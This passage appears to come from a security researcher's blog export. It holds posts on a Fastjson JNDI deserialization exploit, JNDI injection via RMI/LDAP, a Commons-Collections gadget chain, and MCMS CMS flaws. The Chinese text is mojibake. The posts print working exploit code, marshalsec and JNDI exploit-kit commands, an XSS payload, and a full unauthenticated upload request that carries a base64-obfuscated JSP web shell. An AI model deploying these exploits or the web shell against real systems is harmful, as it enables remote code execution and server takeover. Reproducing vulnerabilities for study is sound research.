<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//JNDIClient.java</span></span><br><span class="line"><span class="keyword">package</span> com.fastjsonser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JNDIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        String payload = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//badclassname.class</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">badClassName</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/usr/bin/gnome-calculator&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><p>åŸºäºRMIåˆ©ç”¨çš„JDKç‰ˆæœ¬ â‰¤ 6u141ã€7u131ã€8u121ï¼Œ</p>
<h4 id="åˆ©ç”¨æ–¹æ³•"><a href="#åˆ©ç”¨æ–¹æ³•" class="headerlink" title="åˆ©ç”¨æ–¹æ³•"></a>åˆ©ç”¨æ–¹æ³•</h4><p>è¿è¡Œ<code>JNDIServer</code></p>
<p>åœ¨badclassnameç›¸åŒç›®ä¸‹å¼€å¯httpæœåŠ¡</p>
<p>è¿è¡Œ<code>JNDIClient</code></p>
<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI+LDAP"></a>JNDI+LDAP</h3><p>åªä¿®æ”¹clientçš„payload</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>å¯åŠ¨LDAPServer</p>
<h4 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h4><p>åŸºäºLDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬ â‰¤ 6u211ã€7u201ã€8u19</p>
<p>ä¹Ÿå¯ä»¥ç”¨å·¥å…·æ¥è¿›è¡Œåˆ©ç”¨</p>
<p><a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>è£…æœ‰java8ï¼Œä½¿ç”¨<code>mvn clean package -DskipTests</code>ç¼–è¯‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#rmiæœåŠ¡å™¨ï¼ŒrmiæœåŠ¡èµ·åœ¨8088 æ¶æ„classåœ¨http://ip:8080/æ–‡ä»¶å¤¹/#ExportObject </span><br><span class="line">#ä¸åŠ 8088ç«¯å£å· é»˜è®¤æ˜¯1099</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:8080/æ–‡ä»¶å¤¹/#ExportObject 8088</span><br><span class="line">#rmiæœåŠ¡å™¨ï¼ŒrmiæœåŠ¡èµ·åœ¨8088 æ¶æ„classåœ¨http://ip:8080/æ–‡ä»¶å¤¹/#ExportObject </span><br><span class="line">#ä¸åŠ 8088ç«¯å£å· é»˜è®¤æ˜¯1389</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://ip:8080/æ–‡ä»¶å¤¹/#ExportObject 8088</span><br></pre></td></tr></table></figure>

<p>åŒæ—¶æ¶æ„classæ–‡ä»¶çš„webæœåŠ¡è¿˜éœ€è¦è‡ªå·±å»èµ·ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/6633#toc-5">https://xz.aliyun.com/t/6633#toc-5</a></p>
<p><a href="https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE/#Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE">https://drops.blbana.cc/2020/04/16/Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE/#Fastjson-JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE</a></p>
<p><a href="https://xz.aliyun.com/t/8979#toc-3">https://xz.aliyun.com/t/8979#toc-3</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>RMI,LDAP jndiæ³¨å…¥</title>
    <url>/2021/12/31/RMI-LDAP-jndi%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>ä¹‹å‰ä¸€ç›´ä¸ç†è§£è¿™ä¸ªjndiåˆ°åº•æ˜¯å•¥ï¼Œä¸€å †javaçš„åè®®çœ‹å¾—å¾ˆç³Šæ¶‚ä¸çŸ¥å•¥ç”¨ï¼Œä»Šå¤©ä»”ç»†æ¥çœ‹çœ‹ç»“åˆå·¥å…·åˆ©ç”¨jndiæ³¨å…¥</p>
<span id="more"></span>

<h2 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><h3 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h3><p>è¿™ä¸ªä¹‹å‰æ¥è§¦è¿‡ï¼Œå°±æ˜¯ä¸€ä¸ªjavaã€€jvmçš„rpcå®ç°ï¼Œå¯ä»¥è¿›è¡Œè¿œç¨‹è°ƒç”¨ï¼Œè¿™é‡Œè¡¥ä¸ªå›¾ï¼Œç½‘å›¾éšä¾¿æ‰¾çš„</p>
<p><img src="https://upload-images.jianshu.io/upload_images/12696746-07f8e95ec97df9dd.png?imageMogr2/auto-orient/strip"></p>
<p>è¿™ä¸ªclientè°ƒç”¨çš„ç»“æ„åœ¨è°ƒè¯•ä»£ç æ‰¾jndiå·¥å…·åˆ©ç”¨ä¹‹åæºç ä¸­çš„sinkç‚¹çš„æ—¶å€™å¾ˆæœ‰å¸®åŠ©</p>
<h3 id="ldap"><a href="#ldap" class="headerlink" title="ldap"></a>ldap</h3><p>ç»´åŸºç™¾ç§‘çš„è§£é‡Š</p>
<blockquote>
<p>è½»å‹ç›®å½•è®¿é—®åè®®æ˜¯ä¸€ä¸ªå¼€æ”¾çš„ï¼Œä¸­ç«‹çš„ï¼Œå·¥ä¸šæ ‡å‡†çš„åº”ç”¨åè®®ï¼Œé€šè¿‡IPåè®®æä¾›è®¿é—®æ§åˆ¶å’Œç»´æŠ¤åˆ†å¸ƒå¼ä¿¡æ¯çš„ç›®å½•ä¿¡æ¯ã€‚ ç›®å½•æœåŠ¡åœ¨å¼€å‘å†…éƒ¨ç½‘å’Œä¸äº’è”ç½‘ç¨‹åºå…±äº«ç”¨æˆ·ã€ç³»ç»Ÿã€ç½‘ç»œã€æœåŠ¡å’Œåº”ç”¨çš„è¿‡ç¨‹ä¸­å æ®äº†é‡è¦åœ°ä½ã€‚ä¾‹å¦‚ï¼Œç›®å½•æœåŠ¡å¯èƒ½æä¾›äº†ç»„ç»‡æœ‰åºçš„è®°å½•é›†åˆï¼Œé€šå¸¸æœ‰å±‚çº§ç»“æ„ï¼Œä¾‹å¦‚å…¬å¸ç”µå­é‚®ä»¶ç›®å½•ã€‚</p>
</blockquote>
<p>ç®€å•ç†è§£å®ƒå°±æ˜¯ä¸€ä¸ªä¸ºäº†ç›®å½•æ•°æ®åº“åè®®ï¼Œä¸»è¦å°±æ˜¯ä¸ºäº†æ–¹ä¾¿æŸ¥è¯¢ï¼Œæµè§ˆï¼Œæœç´¢ã€‚</p>
<p>ä½†æ˜¯åœ¨åˆ©ç”¨æ–¹å¼ä¸Šå’Œrmiä¸€æ ·ï¼Œé€šè¿‡åˆ©ç”¨å·¥å…·å¯ä»¥å¾ˆæ–¹ä¾¿çš„èµ·rmiå’ŒladpæœåŠ¡ã€‚</p>
<h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><p>é¦–å…ˆéœ€è¦ä¸€äº›å·¥å…·</p>
<ul>
<li><p>jndiåˆ©ç”¨å·¥å…·</p>
<p>è¿™ä¸ªå…¶å®æ˜¯ä¿®æ”¹ç‰ˆï¼ŒåŠ äº†ä¸€äº›bypassçš„é€‰é¡¹</p>
<p><a href="https://github.com/pimps/JNDI-Exploit-Kit">https://github.com/pimps/JNDI-Exploit-Kit</a></p>
<p>åŸç‰ˆæ˜¯æ”¹é¡¹ç›®çš„forkä»“åº“</p>
<p>ç›´æ¥ä¸‹ä»–çš„jaråŒ…å°±å¥½ï¼Œæˆ‘æ‡’å¾—mavenç¼–è¯‘ä¸€é</p>
</li>
<li><p>æœåŠ¡ç«¯</p>
<p>jndiåˆ©ç”¨å·¥å…·çš„ä½œç”¨å°±æ˜¯è®©æˆ‘ä»¬ä¸ç”¨è‡ªå·±æ‰‹åŠ¨ç”¨ä»£ç æ­å»ºrmiæœåŠ¡ç«¯/ ladpæœåŠ¡ç«¯å’ŒhttpæœåŠ¡å™¨äº†</p>
<p>å®ƒä¼šåœ¨æœ¬æœºèµ·httpæœåŠ¡å’ŒrmiæœåŠ¡å’ŒladpæœåŠ¡ï¼Œæ ¹æ®ä½ çš„å‘½ä»¤æ„é€ æ¶æ„çš„ç±»ç¼–è¯‘è¿‡å­—èŠ‚ç ã€‚</p>
<p>ç›´æ¥ä½¿ç”¨</p>
<p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C gnome-calculator</code></p>
<p>-C æ˜¯å¡«å†™éœ€è¦å‘½ä»¤ï¼Œå…·ä½“çš„å‘½ä»¤å‚æ•°åœ¨githubæœ‰</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640938374674-2021-12-3116:12:54.png"></p>
</li>
<li><p>å®¢æˆ·ç«¯(å—å®³è€…)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndiTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//ã€€æˆ‘çš„jdkç‰ˆæœ¬æ˜¯1.8.0_171ï¼Œæ‰€ä»¥éœ€è¦åŠ è¿™ä¸ªä¿¡ä»»codeBase</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        InitialContext ctx =  <span class="keyword">new</span> InitialContext();</span><br><span class="line">        Object obj =  ctx.lookup(<span class="string">&quot;rmi://192.168.100.103:1099/0uvgtw&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°lookupè¿™é‡Œæ˜¯sourceç‚¹ï¼Œè¿™é‡Œå¼•å…¥äº†ä¸å®‰å…¨è¿œç¨‹è°ƒç”¨ï¼Œ<strong>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°æ¼æ´åˆ©ç”¨çš„æ¡ä»¶éœ€è¦lookupçš„å‚æ•°å¯æ§</strong></p>
<p>å¦ä¸€ä¸ªåˆ©ç”¨çš„é™åˆ¶å°±æ˜¯ï¼Œå…³äºjdkçš„ç‰ˆæœ¬ï¼Œè¿™é‡Œè´´ä¸€ä¸ªå¸ˆå‚…åšçš„ç‰ˆæœ¬ä¿¡æ¯å›¾ï¼Œæˆ‘ä¸€å¼€å§‹jdkç‰ˆæœ¬<code>1.8.0_282</code>æ˜¯æ²¡æ³•è§¦å‘è¿™ä¸ªæ¼æ´çš„</p>
<p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g89d6g04jvj317r0h70ua.jpg"></p>
</li>
</ul>
<p>â€‹        è¿è¡Œä»£ç å¼¹å‡ºè®¡ç®—å™¨ï¼Œå¤ç°æˆåŠŸ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640938978933-2021-12-3116:22:58.png"></p>
<h2 id="æ³¨å…¥åŸç†"><a href="#æ³¨å…¥åŸç†" class="headerlink" title="æ³¨å…¥åŸç†"></a>æ³¨å…¥åŸç†</h2><p>æ ¹æ®å¸ˆå‚…çš„æ­¥éª¤èµ°ä¸€ä¸‹ï¼Œæˆ‘æºç é˜…è¯»è¿˜æ˜¯å¤ªèœäº†</p>
<p>è°ƒç”¨çš„å †æ ˆ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939081645-2021-12-3116:24:41.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939440780-2021-12-3116:30:40.png"></p>
<p>è¿›å…¥RegisterContextå‡½æ•°</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939672951-2021-12-3116:34:32.png"></p>
<p>è¿”å›æ¥ä¹‹åreturn,ç»§ç»­step overï¼Œåˆ°var3çš„lookupå¤„è¿›å…¥</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640939911719-2021-12-3116:38:31.png"></p>
<p>ä¸€è·¯step overç„¶åæ‰¾åˆ°decodeObjectè¿›å…¥</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940220047-2021-12-3116:43:40.png"></p>
<p>è·Ÿè¿›ä¸€è·¯step over,ç›´åˆ°getObjectInstanceè¿›å…¥</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940540128-2021-12-3116:49:00.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940728580-2021-12-3116:52:08.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940862284-2021-12-3116:54:22.png"></p>
<p>æ‰§è¡Œè½½å…¥ç±»ï¼Œåˆ°è¿™é‡Œå°±å®Œæˆäº†ä»£ç çš„æ‰§è¡Œ</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640940909586-2021-12-3116:55:09.png"></p>
<p>è¿™é‡Œæˆ‘æœ‰ä¸ªç–‘æƒ‘å°±æ˜¯ä¸ºä»€ä¹ˆloadclassä¹‹åæ¶æ„çš„ä»£ç å°±è‡ªåŠ¨æ‰§è¡Œäº†</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://xz.aliyun.com/t/6633#toc-5">https://xz.aliyun.com/t/6633#toc-5</a></p>
<p><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Javaå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>ccé“¾å­¦ä¹ </title>
    <url>/2022/06/04/cc%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>commons-collections ç»„ä»¶ååºåˆ—åŒ–è°ƒç”¨é“¾æ¼æ´ï¼Œç®€ç§°ccé“¾åˆ©ç”¨</p>
<span id="more"></span>

<h1 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">commons_collections_3_1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//æ­¤å¤„æ„å»ºäº†ä¸€ä¸ªtransformersçš„æ•°ç»„ï¼Œåœ¨å…¶ä¸­æ„å»ºäº†ä»»æ„å‡½æ•°æ‰§è¡Œçš„æ ¸å¿ƒä»£ç </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;gnome-calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//å°†transformersæ•°ç»„å­˜å…¥ChaniedTransformerè¿™ä¸ªç»§æ‰¿ç±»</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åˆ›å»ºMapå¹¶ç»‘å®štransformerChina</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//ç»™äºˆmapæ•°æ®è½¬åŒ–é“¾</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è§¦å‘æ¼æ´</span></span><br><span class="line">        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">        <span class="comment">//outerMapåä¸€ä¸²ä¸œè¥¿ï¼Œå…¶å®å°±æ˜¯è·å–è¿™ä¸ªmapçš„ç¬¬ä¸€ä¸ªé”®å€¼å¯¹ï¼ˆvalue,valueï¼‰ï¼›ç„¶åè½¬åŒ–æˆMap.Entryå½¢å¼ï¼Œè¿™æ˜¯mapçš„é”®å€¼å¯¹æ•°æ®æ ¼å¼</span></span><br><span class="line">        onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ConstantTransformerè¿™ä¸ªç±»ï¼Œç»™ä»–ä»€ä¹ˆå¯¹è±¡ä»–å°±è¿”å›ä»€ä¹ˆå¯¹è±¡</p>
<p>InvokerTransformerè¿™ä¸ªç±»çš„å‚æ•°å®Œå…¨å¯æ§ï¼Œå¯ä»¥é€šè¿‡åå°„æ„é€ rce</p>
<p>ChainedTransformeræ˜¯Transformerçš„ä¸€ä¸ªlistï¼Œåœ¨å‡½æ•°å†…éƒ¨è¿›è¡Œäº†transferå‡½æ•°çš„è°ƒç”¨</p>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p>è¿™ç¯‡éå¸¸çš„å‹å¥½ï¼Œèœé¸¡å¦‚æˆ‘ä¹Ÿçœ‹æ‡‚çš„7788</p>
<p><a href="https://xz.aliyun.com/t/7031#toc-1">https://xz.aliyun.com/t/7031#toc-1</a></p>
<p><a href="https://www.cnblogs.com/bitterz/p/15035581.html">https://www.cnblogs.com/bitterz/p/15035581.html</a></p>
<p><a href="https://github.com/frohoff/ysoserial/tree/master">https://github.com/frohoff/ysoserial/tree/master</a></p>
<p><a href="https://xz.aliyun.com/t/9451#toc-19">https://xz.aliyun.com/t/9451#toc-19</a></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>Javaå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>MCMS vulnerabilities</title>
    <url>/2021/12/28/MCMS-vulnerabilities/</url>
    <content><![CDATA[<p>An open source  CMS Project,<a href="https://github.com/ming-soft/MCMS">https://github.com/ming-soft/MCMS</a>  </p>
<p>the  MCMS vulnerabilities include </p>
<ul>
<li>Reflect XSS</li>
<li>Unauthorized file upload</li>
<li>Authorized file delete</li>
</ul>
<span id="more"></span>

<h2 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h2><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>path <code>/ms/template/unzip.do</code> exist reflect xss</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674036583-2021-12-2814:47:16.png"></p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ms/template/unZip.do?fileUrl=%3C/p%3E%3Cimg%20src=x%20onerror=alert(%27hacking%27)%3E</span><br></pre></td></tr></table></figure>



<h3 id="Authorized-file-upload-to-RCE"><a href="#Authorized-file-upload-to-RCE" class="headerlink" title="Authorized file upload to RCE"></a>Authorized file upload to RCE</h3><p>Authorized file uploads exist </p>
<p>path <code>/ms/file/uploadTemplate.do</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674695100-2021-12-2814:58:15.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674447313-2021-12-2814:54:07.png"></p>
<p>need login get Cookie and upload file</p>
<h3 id="Unauthorized-file-upload-to-RCE"><a href="#Unauthorized-file-upload-to-RCE" class="headerlink" title="Unauthorized file upload to RCE"></a>Unauthorized file upload to RCE</h3><p>path <code>/file/upload</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674792504-2021-12-2814:59:52.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640674556372-2021-12-2814:55:56.png"></p>
<p>as above picture ,hacker can upload <code>.jspx</code> file to server without any identity verification , <strong>and even when project packaged war deploy in tomcat can get web shell from server.</strong> </p>
<blockquote>
<p>the system filter suffix <code>.jsp</code> but still can  use <code>.jspx</code> to bypass </p>
</blockquote>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /file/upload.do HTTP/1.1</span><br><span class="line">Host: 192.168.100.103:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------124088951720288539841514905041</span><br><span class="line">Content-Length: 1393</span><br><span class="line">Origin: http://192.168.100.103:8080</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;uploadPath&quot;</span><br><span class="line"></span><br><span class="line">/</span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;isRename&quot;</span><br><span class="line"></span><br><span class="line">false</span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;appId&quot;</span><br><span class="line"></span><br><span class="line">false</span><br><span class="line">-----------------------------124088951720288539841514905041</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.jspx&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;sun.misc.BASE64Decoder&quot; %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">if(request.getParameter(&quot;cmd&quot;)!=null)&#123;</span><br><span class="line">    BASE64Decoder decoder = new BASE64Decoder();</span><br><span class="line">    Class rt = Class.forName(new String(decoder.decodeBuffer(&quot;amF2YS5sYW5nLlJ1bnRpbWU=&quot;)));</span><br><span class="line">    Process e = (Process)</span><br><span class="line">            rt.getMethod(new String(decoder.decodeBuffer(&quot;ZXhlYw==&quot;)), String.class).invoke(rt.getMethod(new</span><br><span class="line">                    String(decoder.decodeBuffer(&quot;Z2V0UnVudGltZQ==&quot;))).invoke(null, new</span><br><span class="line">                    Object[]&#123;&#125;), request.getParameter(&quot;cmd&quot;) );</span><br><span class="line">    java.io.InputStream in = e.getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line">-----------------------------124088951720288539841514905041--</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p><code>net/mingsoft/basic/action/ManageFileAction.java</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640675058416-2021-12-2815:04:18.png"></p>
<h3 id="Authorized-file-delete"><a href="#Authorized-file-delete" class="headerlink" title="Authorized file delete"></a>Authorized file delete</h3><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640675200781-2021-12-2815:06:40.png"></p>
<p><code>net/mingsoft/basic/action/TemplateAction.java</code></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1640668607171-2021-12-2813:16:47.png"></p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /ms/template/unZip.do?fileUrl=HACKED HTTP/1.1</span><br><span class="line">Host: 192.168.100.103:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://192.168.100.103:8080/ms/template/index.do?</span><br><span class="line">Cookie: JSESSIONID=56EC9CCC14E1E8DEE4AACCF732EA7FC7; pageno_cookie=1</span><br></pre></td></tr></table></figure>



<h4 id=""><a href="#" class="headerlink" title=""></a></h4>]]></content>
  </entry>
  <entry>
    <title>fastjson1.2.22-1.2.24ååºåˆ—åŒ–æµç¨‹</title>
    <url>/2021/11/09/fastjson1-22-1-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ¥ä¸Šä¸€ç¯‡è¿›è¡Œ1.2.22-.1.2.24 fastjsonæºç æ¼æ´çš„åˆ†æ</p>
<span id="more"></span>

